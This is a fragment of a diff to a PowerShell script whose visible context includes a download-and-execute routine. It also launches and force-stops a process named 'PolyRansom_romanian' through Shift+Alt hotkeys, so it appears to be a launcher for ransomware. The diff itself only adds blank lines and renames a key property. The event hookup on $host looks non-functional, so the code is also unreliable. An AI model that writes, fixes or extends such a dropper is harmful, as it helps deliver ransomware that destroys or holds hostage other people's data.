@@ -49,9 +49,11 @@ function DownloadAndExecute {
     }
 }
 
+
 function CloseApplication {
     Stop-Process -Name "PolyRansom_romanian" -Force
 }
+
 
 function OpenApplication {
     Start-Process -FilePath $downloadPath -Wait
@@ -62,13 +64,14 @@ DownloadAndExecute
 
 
 Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
-    if ($_.Key -eq "I" -and $_.Shift -and $_.Alt) {
+    if ($_.KeyCode -eq "I" -and $_.Shift -and $_.Alt) {
         CloseApplication
     }
 } | Out-Null
 
+
 Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
-    if ($_.Key -eq "O" -and $_.Shift -and $_.Alt) {
+    if ($_.KeyCode -eq "O" -and $_.Shift -and $_.Alt) {
         OpenApplication
     }
 } | Out-Null
@@ -78,5 +81,6 @@ try {
     Wait-Event -Action { } -Timeout ([System.Threading.Timeout]::Infinite)
 }
 finally {
+
     Get-EventSubscriber | Unregister-Event
 }
